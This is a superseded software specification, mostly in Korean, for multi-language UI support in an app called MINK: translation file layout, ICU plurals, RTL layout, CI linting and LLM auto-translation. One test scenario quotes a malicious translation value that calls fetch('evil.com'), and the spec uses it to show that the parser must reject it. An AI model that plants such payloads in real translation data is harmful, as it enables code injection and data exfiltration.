---
id: SPEC-GOOSE-I18N-001
version: 0.2.2
status: superseded
superseded_by: SPEC-MINK-I18N-001
created_at: 2026-04-22
updated_at: 2026-05-14
author: manager-spec
priority: P0
issue_number: null
phase: 6
size: 중(M)
lifecycle: spec-anchored
labels: [i18n, localization, ui, rtl, icu, phase-6, post-brand-rename, superseded]
---

# SPEC-GOOSE-I18N-001 — UI Internationalization (20+ Languages, Plurals, RTL)

> **POST-BRAND-RENAME NOTICE (2026-05-14)**: 본 SPEC 은 SPEC-MINK-BRAND-RENAME-001 (commit f0f02e4, 2026-05-13) 이전에 작성된 draft 이다. 본문 곳곳에 MINK 명칭이 남아 있으며, 후속 implementation 진입 시 다음 중 하나로 처리해야 한다.
>
> 1. **MINK 로 rebrand** — id `SPEC-MINK-I18N-001` 신설, 본 SPEC 은 status=superseded
> 2. **본문 내 MINK 치환** — id 유지, 본문 MINK → MINK 치환 (BRAND-RENAME-001 의 binary rename 정책과 align)
>
> 후속 implementation 진입 직전에 결정. 본 marker 가 추가되기 전까지 본 SPEC 은 "draft, awaiting brand-rename decision" 상태이다.

## HISTORY

| 버전 | 날짜 | 변경 사유 | 담당 |
|-----|------|---------|------|
| 0.2.0 | 2026-04-25 | 감사 리포트(mass-20260425/I18N-001-audit.md) 반영: frontmatter `labels` 채움 및 `status: draft`로 정규화, §5 header "Test Scenarios"로 변경 + "Verifies: REQ-I18N-XXX" 라인 추가(D3), REQ-013/015/016 Unwanted 정형화(D4), REQ-018 `may`→조건부 `shall`(D5), REQ-016 Tier 1/Tier 2 범위로 한정(D8), REQ-019(BCP 47 regional fallback chain) 신설(D9), 누락 AC 6개 추가(D7), REQ-020(calendar-system 렌더링) 신설(D14), gender/context-dependent 번역은 Exclusions 명시(D10/D11), CI exit code 일관화(D13). | manager-spec |
| 0.1.0 | 2026-04-22 | 초안 작성. v5.0 ROADMAP Phase 6 Localization 시리즈 2번째. LOCALE-001이 제공하는 `primary_language`를 소비하여 20+ 언어 UI 번역 제공. Hermes 수준 다국어. | manager-spec |
| 0.2.1 | 2026-05-14 | POST-BRAND-RENAME marker 추가. BRAND-RENAME-001 (commit f0f02e4) 이후 MINK prefix draft 의 후속 처리 (rebrand vs 본문 치환) 미결정. frontmatter created_at/updated_at 인용부호 정규화 (다른 SPEC 들과 동일 unquoted 스타일 align). labels 에 `post-brand-rename` 추가. | manager-spec |
| 0.2.2 | 2026-05-14 | Superseded by SPEC-MINK-I18N-001 (rebrand 옵션 c 선택). frontmatter status=draft → superseded, superseded_by 추가, labels 에 `superseded` 추가. 본문 body 는 immutable 로 유지 (BRAND-RENAME-001 OUT-scope 정책). 후속 implementation 은 SPEC-MINK-I18N-001 에서 진행. | manager-spec |

---

## 1. 개요 (Overview)

사용자 지시(2026-04-22):

> "hermes-agent 정도의 다국어를 제공하자."

본 SPEC은 **MINK의 모든 UI 표면(Desktop App, Mobile App, CLI 메시지, 에러 메시지, 알림 텍스트)을 20+ 언어로 제공**하는 번역 시스템을 정의한다. LOCALE-001이 제공한 `LocaleContext.primary_language`(BCP 47)를 소비하여 런타임에 적절한 locale bundle을 로드하고, ICU MessageFormat 기반 플루럴/날짜/숫자/통화 포맷팅을 수행하며, RTL 언어(ar/he)의 레이아웃 대칭화를 지원한다.

티어링:

- **Tier 1 (완전 지원, 네이티브 리뷰)**: en, ko, ja, zh-CN — 4개 언어, 핵심 UI 100% 번역
- **Tier 2 (완전 지원, 커뮤니티 리뷰)**: es, fr, de, pt-BR, ru, vi, th, id, ar, hi, tr, pl — 12개 언어
- **Tier 3 (LLM 자동번역 + 수정 가능)**: 그 외 BCP 47 코드 — 커뮤니티 기여

본 SPEC이 통과하면:

- `internal/i18n/`(Go backend) 패키지와 `packages/*/src/i18n/`(TS frontend) 모듈이 동기화된 번역 키 스키마를 제공,
- 번역 파일 포맷은 **YAML 한 파일 = 한 언어 = 한 네임스페이스** (`packages/goose-desktop/locales/ko/common.yaml`),
- 플루럴은 ICU MessageFormat,
- 숫자/날짜/통화/상대시간은 `Intl.*` (frontend) + `golang.org/x/text/*` (backend),
- RTL은 CSS logical properties + `dir="rtl"` 자동 적용,
- 누락 번역 키는 CI에서 경고(`mink i18n lint`),
- 개발 모드에서 hot reload.

---

## 2. 배경 (Background)

### 2.1 왜 20+ 언어인가

사용자 지시(2026-04-22)는 "hermes-agent 정도의 다국어"를 명시. Hermes가 프로바이더 15+를 지원하듯, MINK는 **사용자 언어 20+**를 지원한다. 세계 상위 20개 언어의 L1(원어) 사용자 인구만으로도 약 50억 명 커버.

### 2.2 왜 Tier 구조인가

- Tier 1(en/ko/ja/zh): MoAI-ADK와 MINK 기존 문서가 이미 4개 언어로 정비됨(`branding.md` §3, `adaptation.md` §4). 네이티브 품질 유지.
- Tier 2(12개): OpenStreetMap, Wikipedia 다국어 커뮤니티에서 안정적으로 유지되는 언어군. 초기 LLM 자동번역 → 커뮤니티 PR로 품질 개선.
- Tier 3(무제한): BCP 47 코드가 들어오면 로드 시 LLM(`ADAPTER-001`)로 자동번역 시도. 사용자가 수정 후 PR로 기여하면 Tier 2 승격.

### 2.3 왜 `go-i18n/v2` + `i18next`

| 후보 | Go | TS | ICU | 플루럴 | RTL | 결정 |
|------|----|----|----|-------|-----|------|
| `nicksnyder/go-i18n/v2` + `i18next` | ✅ | ✅ | ✅ | ✅ | ✅(i18next-rtl) | **채택** |
| `go-i18n` + `react-intl` | ✅ | ✅ | ✅(FormatJS) | ✅ | ✅ | 대안 |
| `gotext` + `lingui` | ✅ | ✅ | 부분 | ✅ | 부분 | 제외 |
| 자체 구현 | — | — | 복잡 | 복잡 | 복잡 | 제외 |

`go-i18n/v2`: GitHub 3k+ star, 메시지 파일 YAML/TOML/JSON 지원, CLDR 플루럴 규칙 내장.
`i18next`: GitHub 7k+ star(+ `react-i18next` 8k+), 60+ 플러그인, hot reload/lazy load 우수.

### 2.4 ICU MessageFormat 필요성

단순 문자열 치환(`"Hello, {{name}}"`)으로는 해결 불가한 케이스:

- **플루럴**: 영어는 1/other, 러시아어는 1/few/many/other, 아랍어는 0/1/2/few/many/other (6가지)
- **성별**: 포르투갈어 `{gender, select, masculine {o usuário} feminine {a usuária}}`
- **서수**: 영어 1st/2nd/3rd/4th, 한국어는 차이 없음
- **동적 선택**: `{count, plural, =0 {메시지 없음} one {# 메시지} other {# 메시지}}`

ICU MessageFormat은 이 모두를 선언적으로 해결. `go-i18n/v2`와 `i18next`(+ `i18next-icu` 플러그인) 모두 지원.

### 2.5 RTL 레이아웃

아랍어, 히브리어, 페르시아어, 우르두어는 우→좌. 단순 문자열 번역이 아니라 **레이아웃 대칭화** 필요:

- `margin-left` → `margin-inline-start`
- `flex-direction: row` → `flex-direction: row-reverse` (자동으로는 logical properties가 대부분 해결)
- 아이콘(화살표 등)은 `transform: scaleX(-1)` 또는 별도 자산

Desktop(Tailwind 4.x + logical properties) + Mobile(React Native `I18nManager.isRTL`) 모두 지원.

### 2.6 범위 경계

- **IN**: 번역 키 schema, 20+ 언어 번들, ICU MessageFormat, 날짜/숫자/통화/상대시간 포맷, RTL 레이아웃 자동 전환, hot reload(개발), 누락 키 CI linter, LLM 자동번역 pipeline(Tier 3).
- **OUT**: 번역 관리 웹 UI(Crowdin/Lokalise 연동은 v1.5+), 사용자 생성 콘텐츠(UGC) 번역, TTS(음성 합성 다국어), OCR 다국어, 실시간 다자간 통역.

---

## 3. 스코프 (Scope)

### 3.1 IN SCOPE

1. **Backend (Go)** — `internal/i18n/` 패키지:
   - `loader.go` — 번역 파일 로더(YAML → `map[lang]map[key]string`)
   - `formatter.go` — ICU MessageFormat 렌더링
   - `pluralizer.go` — CLDR 플루럴 규칙 resolver
   - `rtl.go` — RTL 언어 감지 (ar, he, fa, ur, yi)
   - `translator.go` — `Translator` 인터페이스 + `T(key, args, lang)` 함수
2. **Frontend (TypeScript)** — `packages/goose-desktop/src/i18n/` + `packages/goose-mobile/src/i18n/`:
   - `i18next` + `react-i18next` 설정
   - `i18next-icu` 플러그인으로 ICU MessageFormat 활성화
   - `i18next-http-backend`로 동적 로드 (개발), 번들 static (production)
   - Tauri IPC로 backend Translator와 키 동기화
3. **번역 파일 구조**:
   ```
   packages/goose-desktop/locales/{lang}/common.yaml
   packages/goose-desktop/locales/{lang}/ritual.yaml
   packages/goose-desktop/locales/{lang}/onboarding.yaml
   packages/goose-mobile/locales/{lang}/common.yaml
   packages/goose-mobile/locales/{lang}/push.yaml
   internal/i18n/locales/{lang}/errors.yaml
   internal/i18n/locales/{lang}/prompts.yaml
   ```
4. **20+ 언어 초기 번들**:
   - Tier 1 (4): en, ko, ja, zh-CN — 핵심 100% 번역 (사람)
   - Tier 2 (12): es, fr, de, pt-BR, ru, vi, th, id, ar, hi, tr, pl — 초기 LLM + 커뮤니티
   - Tier 3: 그 외 BCP 47 코드는 요청 시 LLM 자동번역 후 레지스트리 등록
5. **포맷팅**:
   - 날짜: `Intl.DateTimeFormat` (frontend), `golang.org/x/text/date` (backend)
   - 숫자: `Intl.NumberFormat`, `x/text/number`
   - 통화: 위 + ISO 4217 코드(LOCALE-001 `currency` 필드 소비)
   - 상대 시간: `Intl.RelativeTimeFormat`, 백엔드는 자체 구현(10줄)
   - 리스트: `Intl.ListFormat` (예: "사과, 배, 바나나" vs "apples, pears, and bananas")
6. **RTL 지원**:
   - Desktop: `html[dir="rtl"]` + Tailwind `rtl:` variant
   - Mobile: `I18nManager.forceRTL(true)` + logical flexbox
   - 아이콘 자산: LTR + RTL 대칭 버전 (화살표, 진행 인디케이터)
7. **Content Negotiation**:
   - Tauri HTTP backend가 있는 경우 `Accept-Language` 헤더를 LocaleContext.primary_language로 설정
   - 서버 응답의 `Content-Language`는 무시(클라이언트 선택 우선)
8. **Hot Reload (개발)**:
   - `i18next-http-backend` + `chokidar` 파일 감시
   - YAML 저장 시 5초 내 UI 갱신
9. **CI Linter**:
   - `mink i18n lint` 명령:
     - 누락 키 감지(Tier 1 언어에서 영어 대비)
     - ICU 문법 검증
     - 사용 안 된 키 감지
     - 미번역 키(Tier 1만, Tier 2+는 fallback 허용)
   - Exit code: `0`(pass), `1`(Tier 1 누락 또는 ICU 구문 오류, CI fail), `2`(Tier 2 누락 또는 WARN만, CI pass). §6.7과 일관. CI 파이프라인은 exit code `1`만 블로킹한다.
10. **LLM 자동번역 파이프라인 (Tier 3)**:
    - 새 언어 코드 요청 시 `en.yaml` 전체를 ADAPTER-001에 전달
    - 응답을 `{new_lang}.yaml`로 저장
    - 자동번역 키에 `_machine_translated: true` 마커 추가 → UI에서 "자동번역" 배지 노출
    - 사용자가 수정하면 마커 제거

### 3.2 OUT OF SCOPE

- **번역 관리 SaaS**(Crowdin, Lokalise, Phrase): v1.5+ 별도 SPEC.
- **In-context editing**(번역자가 앱 안에서 바로 수정): v2+.
- **사용자 생성 콘텐츠 번역**: 일기, 메모, 대화는 번역 대상 아님(LLM이 필요 시 처리).
- **TTS/STT 다국어 음성**: MOBILE-001 Whisper + Picovoice Porcupine의 책임.
- **문화권별 이모지 변형**(🎉 vs 🧧): branding 레이어.
- **RTL 콘텐츠 내부 BiDi**(영어 단어를 아랍 문장에 혼용): Unicode BiDi 알고리즘에 위임.
- **WebAssembly ICU**: bundle 크기 이유로 제외.
- **번역 품질 자동 평가**: LLM self-eval은 v2+.

---

## 4. EARS 요구사항 (Requirements)

### 4.1 Ubiquitous

**REQ-I18N-001 [Ubiquitous]** — The backend `Translator.T(key, args, lang)` function **shall** return a deterministic UTF-8 string for any given (key, args, lang) triple, modulo time-dependent placeholders.

**REQ-I18N-002 [Ubiquitous]** — The frontend `t(key, args)` hook (from `react-i18next`) **shall** always return a string (never null/undefined); missing keys **shall** fall back to the English value if present, then to the key string itself with a visible marker `[MISSING: key]` in development builds only.

**REQ-I18N-003 [Ubiquitous]** — Translation files **shall** be valid UTF-8 YAML with Unix line endings; the loader **shall** reject BOM, CRLF, and mixed indentation.

**REQ-I18N-004 [Ubiquitous]** — All Tier 1 languages (en, ko, ja, zh-CN) **shall** have 100% key coverage enforced by the `mink i18n lint` CI gate.

### 4.2 Event-Driven

**REQ-I18N-005 [Event-Driven]** — **When** the application starts, the i18n system **shall** read `LocaleContext.primary_language` from CONFIG-001 (provided by LOCALE-001) and load the matching locale bundle; if bundle is missing, fall back to `en-US`.

**REQ-I18N-006 [Event-Driven]** — **When** a translation key includes ICU plural syntax (e.g., `{count, plural, one {# item} other {# items}}`), the formatter **shall** resolve using CLDR plural rules for the active language.

**REQ-I18N-007 [Event-Driven]** — **When** the active language is a RTL language (ar, he, fa, ur, yi), the Desktop app **shall** set `document.documentElement.dir = "rtl"` and the Mobile app **shall** call `I18nManager.forceRTL(true)` followed by a restart prompt.

**REQ-I18N-008 [Event-Driven]** — **When** a Tier 3 language is requested but no bundle exists, the system **shall** invoke the LLM auto-translation pipeline (ADAPTER-001), save the result to `locales/{lang}/*.yaml` with `_machine_translated: true` markers, and emit a notification to the user that translations are machine-generated.

**REQ-I18N-009 [Event-Driven]** — **When** in development mode and a YAML translation file is modified on disk, the i18n system **shall** reload that file and emit a UI refresh event within 5 seconds.

### 4.3 State-Driven

**REQ-I18N-010 [State-Driven]** — **While** a translation value contains `_machine_translated: true` metadata, the UI **shall** render the translated text alongside a small "자동번역" / "machine-translated" badge that links to the contribution guide.

**REQ-I18N-011 [State-Driven]** — **While** the `Translator` is loading locale bundles (async), `T()` calls **shall** return the English value as a synchronous fallback to avoid UI flashes.

**REQ-I18N-012 [State-Driven]** — **While** the user's `LocaleContext.secondary_language` is set, code blocks, technical terms, and proper nouns inside translations **shall** remain in their original language (no double-translation).

### 4.4 Unwanted Behavior

**REQ-I18N-013 [Unwanted]** — **If** a translation value contains non-declarative ICU constructs (e.g., function call syntax, JavaScript expressions, or side-effect invocations), **then** the translator **shall** reject the construct, skip the affected key, and emit one security-audit log entry.

**REQ-I18N-014 [Unwanted]** — **If** a translation YAML file contains a key with a type mismatch (e.g., integer expected, string provided), **then** the loader **shall** log an error and skip that file without crashing the load.

**REQ-I18N-015 [Unwanted]** — **If** the LLM auto-translation pipeline (ADAPTER-001) is invoked, **then** the pipeline **shall** transmit only the source English string and the target BCP 47 language code — no user-identifying context, session state, telemetry, or secondary-language data **shall** be included in the request payload.

**REQ-I18N-016 [Unwanted]** — **If** the i18n system is running in a production build and is loading a Tier 1 or Tier 2 locale bundle, **then** the loader **shall not** perform any network I/O; Tier 1/Tier 2 bundles **shall** be embedded at build time. Tier 3 LLM auto-translation (REQ-I18N-008) is explicitly scoped out of this prohibition and requires explicit user opt-in plus network availability.

### 4.5 Optional

**REQ-I18N-017 [Optional]** — **Where** the user provides a custom translation file via CLI (`mink i18n override --file my-korean.yaml`), the override **shall** take priority over bundled translations for the matching language.

**REQ-I18N-018 [Optional]** — **Where** the active language is Tier 1 AND the user has enabled the `feedback.translation_suggestions` setting in CONFIG-001, the UI **shall** offer an "Improve this translation" inline feedback button that submits suggestions to the GitHub repository.

### 4.6 Addenda (v0.2.0 Event-Driven)

본 섹션은 v0.2.0에서 감사 리포트(D9, D14) 반영을 위해 추가된 Event-Driven REQ이며, REQ 번호 재배치 금지 원칙에 따라 §4.2와 통합하지 않고 별도 섹션으로 유지한다.

**REQ-I18N-019 [Event-Driven]** — **When** the primary language bundle (e.g., `fr-CA`) is missing but a regional parent tag (e.g., `fr`) exists in the locale directory, the loader **shall** resolve the fallback chain by BCP 47 truncation rules (e.g., `fr-CA` → `fr` → `en-US`), loading the first available parent; **if** no parent is available, the loader **shall** fall back to `en-US` as defined in REQ-I18N-005.

**REQ-I18N-020 [Event-Driven]** — **When** a date or calendar-related format call is invoked and `LocaleContext.calendar_system` is non-empty (e.g., `japanese`, `buddhist`, `persian`), the formatter **shall** render dates using the specified calendar system via `Intl.DateTimeFormat` (`calendar` option, frontend) or `golang.org/x/text/date` calendar extension (backend); **if** `calendar_system` is empty, the Gregorian calendar **shall** be used.

---

## 5. 테스트 시나리오 (Test Scenarios)

본 섹션의 Given/When/Then 시나리오들은 EARS 요구사항(§4)을 검증하기 위한 **테스트 설계**이며, 요구사항 자체는 §4에 정의되어 있다. 각 시나리오는 "Verifies: REQ-I18N-XXX" 라인으로 상응 REQ를 명시한다.

**Format declaration**: 아래 23개 시나리오는 Given/When/Then 테스트 설계 포맷을 사용한다. EARS 형식의 normative 요구사항은 §4 (REQ-I18N-001..020)에 위치한다.

**AC-I18N-001 — 기본 키 번역**
- **Given** ko 번들에 `common.yaml: greeting: "안녕하세요"`, en 번들에 `greeting: "Hello"`
- **When** `LocaleContext.primary_language = "ko-KR"`, `t("common:greeting")`
- **Then** `"안녕하세요"` 반환
- **Verifies**: REQ-I18N-001, REQ-I18N-002, REQ-I18N-005

**AC-I18N-002 — 영어 fallback**
- **Given** fr 번들에 `greeting` 키 없음, en에는 있음
- **When** `primary_language = "fr-FR"`, `t("common:greeting")`
- **Then** `"Hello"` 반환 + 개발 모드 콘솔에 `[MISSING: common:greeting for fr]` warn
- **Verifies**: REQ-I18N-002

**AC-I18N-003 — ICU 플루럴 (한국어)**
- **Given** `messages: "{count, plural, =0 {메시지 없음} other {#개의 메시지}}"`
- **When** `t("common:messages", {count: 5})`
- **Then** `"5개의 메시지"` (한국어는 other만)
- **Verifies**: REQ-I18N-006

**AC-I18N-004 — ICU 플루럴 (영어)**
- **Given** `messages: "{count, plural, =0 {no messages} one {# message} other {# messages}}"`
- **When** `t("common:messages", {count: 1})` in `en`, `{count: 5}` in `en`
- **Then** `"1 message"`, `"5 messages"`
- **Verifies**: REQ-I18N-006

**AC-I18N-005 — ICU 플루럴 (러시아어 4 form)**
- **Given** ru 번들에 `messages: "{count, plural, =0 {нет сообщений} one {# сообщение} few {# сообщения} many {# сообщений} other {# сообщений}}"`
- **When** `t("common:messages", {count: 21})` = one(21), `{count: 23}` = few(23), `{count: 25}` = many(25)
- **Then** 각각 `"21 сообщение"`, `"23 сообщения"`, `"25 сообщений"`
- **Verifies**: REQ-I18N-006

**AC-I18N-006 — RTL 전환 (아랍어)**
- **Given** 현재 `primary_language = "en-US"`, Desktop 실행 중
- **When** 사용자가 Preferences에서 `ar-SA`로 변경
- **Then** `document.documentElement.dir === "rtl"`, 메인 레이아웃의 sidebar가 우측으로 이동, 사이드바 내부 아이콘이 대칭화
- **Verifies**: REQ-I18N-007

**AC-I18N-007 — 날짜 포맷**
- **Given** `primary_language = "ko-KR"`, 날짜 `2026-04-22T10:30:00+09:00`
- **When** `formatDate(date, "long")`
- **Then** `"2026년 4월 22일 수요일"`
- **Verifies**: REQ-I18N-001 (Intl.DateTimeFormat 결정론적 렌더링)

**AC-I18N-008 — 통화 포맷 (LOCALE 연계)**
- **Given** `LocaleContext.currency = "KRW"`, 금액 `1_250_000`, `primary_language = "ko-KR"`
- **When** `formatCurrency(amount)`
- **Then** `"₩1,250,000"`
- **Verifies**: REQ-I18N-001

**AC-I18N-009 — 상대 시간**
- **Given** `primary_language = "ja-JP"`, 현재시각 - 3600초
- **When** `formatRelativeTime(past)`
- **Then** `"1時間前"`
- **Verifies**: REQ-I18N-001

**AC-I18N-010 — Tier 3 자동번역 파이프라인**
- **Given** 사용자가 스와힐리어 `sw-TZ` 요청, 해당 번들 없음
- **When** i18n 시스템이 감지
- **Then** ADAPTER-001 호출 → `locales/sw/*.yaml` 생성, 각 키에 `_machine_translated: true` 메타 추가, UI에 "자동번역" 배지 표시
- **Verifies**: REQ-I18N-008, REQ-I18N-010

**AC-I18N-011 — 누락 키 CI lint (Tier 1, exit 1)**
- **Given** ko 번들에 `common:farewell` 키 누락, en에는 존재
- **When** `mink i18n lint`
- **Then** exit code 1 (CI fail), 출력에 `missing key "common:farewell" in ko`
- **Verifies**: REQ-I18N-004

**AC-I18N-012 — 기술용어 보존 (secondary language)**
- **Given** `primary="ko-KR"`, `secondary="en-US"`, 번역 `"{term} 함수를 Promise로 감싸주세요"`, `{term: "async function"}`
- **When** `t(...)`
- **Then** `"async function 함수를 Promise로 감싸주세요"` (영어 기술용어 유지)
- **Verifies**: REQ-I18N-012

**AC-I18N-013 — Hot reload (개발)**
- **Given** dev 모드에서 `locales/ko/common.yaml`의 `greeting` 값을 수정·저장
- **When** 파일 저장 후
- **Then** 5초 이내 UI에 새 값 반영 (페이지 reload 불필요)
- **Verifies**: REQ-I18N-009

**AC-I18N-014 — ICU 코드 실행 거부**
- **Given** 악의적 YAML에 `evil: "{eval, function, () => fetch('evil.com')}"`
- **When** 파싱
- **Then** 파서가 reject, 해당 키 로드 skip, security log 1건 기록
- **Verifies**: REQ-I18N-013

**AC-I18N-015 — 20+ 언어 번들 존재 확인**
- **Given** 릴리스 빌드
- **When** `packages/goose-desktop/locales/` 디렉토리 스캔
- **Then** en, ko, ja, zh-CN, es, fr, de, pt-BR, ru, vi, th, id, ar, hi, tr, pl 최소 16개 언어 디렉토리 존재 (Tier 1 + Tier 2)
- **Verifies**: REQ-I18N-004, REQ-I18N-016

**AC-I18N-016 — UTF-8 / BOM / CRLF 거부**
- **Given** `locales/ko/common.yaml`이 UTF-8 BOM (`0xEF 0xBB 0xBF`)으로 시작하거나 CRLF (`\r\n`) 줄끝을 포함함
- **When** Loader.Load() 실행
- **Then** 해당 파일은 로드 skip, 에러 로그 1건(`rejected: BOM present` 또는 `rejected: CRLF line endings in <path>`), 나머지 언어 번들은 정상 로드되어 애플리케이션이 크래시 없이 기동
- **Verifies**: REQ-I18N-003

**AC-I18N-017 — 번들 로드 중 동기 영어 fallback**
- **Given** i18next 번들이 아직 네트워크/파일시스템에서 비동기 로드 중 (`i18next.isInitialized === false`)
- **When** UI 컴포넌트가 `t("common:greeting")`을 동기적으로 호출
- **Then** `"Hello"` (en 동기 fallback 값) 반환, Promise/undefined 반환 없음, 컴포넌트는 로드 완료 후 재렌더시 번역 값으로 대체
- **Verifies**: REQ-I18N-011

**AC-I18N-018 — YAML 타입 미스매치 허용 (크래시 없음)**
- **Given** `locales/de/common.yaml`에 `greeting: 42` (integer, 기대 타입 string)
- **When** Loader.Load() 실행
- **Then** 해당 파일 로드 skip, `[ERROR] de/common.yaml: type mismatch at key "greeting" (expected string, got int), file skipped` 로그, 다른 언어(en/ko/...) 번들은 정상 로드, 애플리케이션은 `de` 요청 시 en fallback으로 동작
- **Verifies**: REQ-I18N-014

**AC-I18N-019 — LLM 파이프라인 PII 차단**
- **Given** 사용자가 Tier 3 언어 `sw-TZ`를 요청, `LocaleContext.secondary_language="en-US"`, 사용자 이름/이메일/세션ID가 존재
- **When** ADAPTER-001 호출이 수행되어 아웃바운드 HTTP 요청이 캡처됨
- **Then** 요청 페이로드의 키/값을 inspection한 결과 `source_text`(영어 원문)와 `target_lang="sw-TZ"` 두 필드만 존재, 사용자 이름/이메일/세션ID/secondary_language/텔레메트리 어떤 식별 정보도 포함되지 않음
- **Verifies**: REQ-I18N-015

**AC-I18N-020 — 프로덕션 빌드 Tier 1/2 네트워크 격리**
- **Given** 프로덕션 빌드된 Desktop 앱이 네트워크가 완전히 차단된 환경에서 기동, 사용자 `primary_language="ko-KR"`
- **When** 앱 시작 및 UI 렌더
- **Then** Tier 1 `ko` 번들이 embedded 자산에서 로드되어 모든 UI 텍스트가 정상 표시, 아웃바운드 소켓 연결 시도 0건, Tier 3 자동번역 트리거 없음(사용자가 명시적 opt-in 하지 않았으므로)
- **Verifies**: REQ-I18N-016

**AC-I18N-021 — CLI 오버라이드 우선순위**
- **Given** 번들 `locales/ko/common.yaml`에 `greeting: "안녕하세요"`, 사용자가 `mink i18n override --file custom-ko.yaml --lang ko` 실행, `custom-ko.yaml`의 `greeting: "반갑습니다"`
- **When** 앱이 `t("common:greeting")` 호출 (`primary_language="ko-KR"`)
- **Then** `"반갑습니다"` 반환(override 우선), 오버라이드되지 않은 다른 키는 번들 기본값 사용
- **Verifies**: REQ-I18N-017

**AC-I18N-022 — BCP 47 regional fallback chain**
- **Given** `locales/` 디렉토리에 `fr/common.yaml`은 존재, `fr-CA/common.yaml`은 부재, `primary_language = "fr-CA"`
- **When** Loader가 `fr-CA` 번들 요청
- **Then** truncation 체인에 의해 `fr` 번들이 로드됨 (`fr-CA` → `fr` 순). 만약 `fr`도 부재하면 `en-US`로 최종 fallback
- **Verifies**: REQ-I18N-019

**AC-I18N-023 — Calendar system 기반 날짜 렌더**
- **Given** `LocaleContext.calendar_system = "japanese"`, `primary_language = "ja-JP"`, 날짜 `2026-04-22`
- **When** `formatDate(date, "long")`
- **Then** 일본 황실력으로 렌더된 문자열(예: `"令和8年4月22日"`). `calendar_system`이 빈 문자열이면 Gregorian `"2026年4月22日"`
- **Verifies**: REQ-I18N-020

---

## 6. 기술적 접근 (Technical Approach)

### 6.1 번역 파일 구조 (YAML)

`packages/goose-desktop/locales/ko/common.yaml`:
```yaml
# MINK Desktop 공통 번역 (한국어)
greeting: "안녕하세요"
farewell: "안녕히 가세요"
messages: "{count, plural, =0 {메시지 없음} other {#개의 메시지}}"

# 네임스페이스 중첩
settings:
  title: "설정"
  language: "언어"
  theme:
    light: "라이트"
    dark: "다크"
    auto: "시스템 설정 따르기"

onboarding:
  step_1_welcome: "MINK에 오신 것을 환영합니다"
  step_2_locale: "여기서 거주하시나요?"
  # ...

# 자동번역 키는 별도 메타 필드로 표시 (Tier 3 경로)
# _machine_translated 은 키당 메타이므로 아래처럼 구조화
_meta:
  machine_translated: []  # 키 경로 목록 (예: ["onboarding.step_3_identity"])
```

### 6.2 Backend Go 타입 시그니처

```go
// internal/i18n/translator.go
package i18n

// Translator — 언어별 번역 실행자. 상태는 LocaleContext에서 온 값에 종속.
type Translator interface {
    T(key string, args map[string]any, lang string) (string, error)
    Format(kind FormatKind, value any, lang string) (string, error)
    IsRTL(lang string) bool
}

type FormatKind int
const (
    FormatDate FormatKind = iota
    FormatNumber
    FormatCurrency
    FormatRelativeTime
    FormatList
)

// PluralRule — CLDR 플루럴 규칙 resolver.
type PluralRule interface {
    Resolve(lang string, n float64) string // "zero"|"one"|"two"|"few"|"many"|"other"
}

// 번들 로드.
type Loader interface {
    Load(localesDir string) (map[string]map[string]string, error)
}

// 공개 함수:
func NewTranslator(loader Loader, logger *zap.Logger) Translator
func RTLLanguages() []string  // ["ar", "he", "fa", "ur", "yi"]
```

### 6.3 Frontend TypeScript 구조

```typescript
// packages/goose-desktop/src/i18n/index.ts
import i18next from "i18next";
import { initReactI18next } from "react-i18next";
import ICU from "i18next-icu";
import Backend from "i18next-http-backend";
import type { LocaleContext } from "../locale/types";

export async function initI18n(locale: LocaleContext) {
  await i18next
    .use(ICU)
    .use(Backend)
    .use(initReactI18next)
    .init({
      lng: locale.primary_language,
      fallbackLng: "en",
      ns: ["common", "settings", "onboarding", "ritual", "push"],
      defaultNS: "common",
      backend: {
        loadPath: "/locales/{{lng}}/{{ns}}.yaml",
      },
      interpolation: { escapeValue: false },
      react: { useSuspense: true },
      // ICU 옵션
      i18nFormat: { memoize: true },
      // RTL 감지
      dir: (lng) => (isRTL(lng) ? "rtl" : "ltr"),
    });

  // RTL 적용
  document.documentElement.dir = i18next.dir();
  document.documentElement.lang = locale.primary_language;
}

export function isRTL(lang: string): boolean {
  return ["ar", "he", "fa", "ur", "yi"].some((rtl) => lang.startsWith(rtl));
}
```

### 6.4 LLM 자동번역 파이프라인 (Tier 3)

```
┌──────────────────────────────────────────────────────────┐
│  사용자 요청: 스와힐리어 `sw-TZ`                           │
└──────────────────────┬───────────────────────────────────┘
                       │
                       ▼
┌──────────────────────────────────────────────────────────┐
│  i18n loader: sw 번들 없음 감지                            │
└──────────────────────┬───────────────────────────────────┘
                       │
                       ▼
┌──────────────────────────────────────────────────────────┐
│  AutoTranslate 파이프라인 시작:                             │
│  1. en/common.yaml 전체 로드                                │
│  2. ADAPTER-001 호출 (prompt: "Translate to sw-TZ, keep    │
│     ICU placeholders intact, preserve technical terms")     │
│  3. 응답을 YAML로 파싱                                      │
│  4. 각 키에 _machine_translated: true 메타 추가             │
│  5. packages/*/locales/sw/*.yaml 저장                       │
└──────────────────────┬───────────────────────────────────┘
                       │
                       ▼
┌──────────────────────────────────────────────────────────┐
│  사용자에게 알림: "번역이 자동 생성되었습니다. 수정하고       │
│   싶으면 ... PR을 보내주세요."                                │
└──────────────────────────────────────────────────────────┘
```

프롬프트 예시:

```
You are translating UI strings for a desktop application called MINK
into Swahili (sw-TZ). Preserve all ICU placeholders like {count, plural, ...}
exactly. Keep technical terms (JavaScript, Promise, API) in English.
The tone is warm and companionable.

Source (English YAML):
greeting: "Hello"
messages: "{count, plural, =0 {no messages} one {# message} other {# messages}}"
...

Return ONLY the translated YAML, no commentary.
```

### 6.5 RTL 구현 (Desktop)

- Tailwind 4.x는 `rtl:` variant 기본 제공 → `<div className="ml-2 rtl:ml-0 rtl:mr-2">`
- 또는 logical properties 사용 → `<div className="ms-2">` (margin-inline-start 자동)
- 아이콘 자산: SVG 기준, CSS `transform: scaleX(-1)` for directional icons
- Popover/Tooltip 위치: Floating UI의 `placement` 자동 RTL 반전

### 6.6 RTL 구현 (Mobile)

- `I18nManager.forceRTL(true)` 호출 후 **앱 재시작 필요** (RN 제약)
- REQ-I18N-007: 재시작 확인 prompt 표시
- React Native 0.76+ Fabric은 logical flexbox 일부 지원

### 6.7 CI Linter (`mink i18n lint`)

```bash
mink i18n lint --locales-dir packages/goose-desktop/locales
```

검증 항목:

1. **Schema**: YAML 유효성, 키 경로 중복 없음
2. **Coverage**: Tier 1 언어가 en 대비 100% 커버리지
3. **ICU Syntax**: `{count, plural, ...}` 블록 파싱 성공
4. **Unused Keys**: grep으로 소스에서 사용 안 된 키 감지 (WARN)
5. **Placeholder Consistency**: 영어와 번역본의 `{variable}` 목록 일치

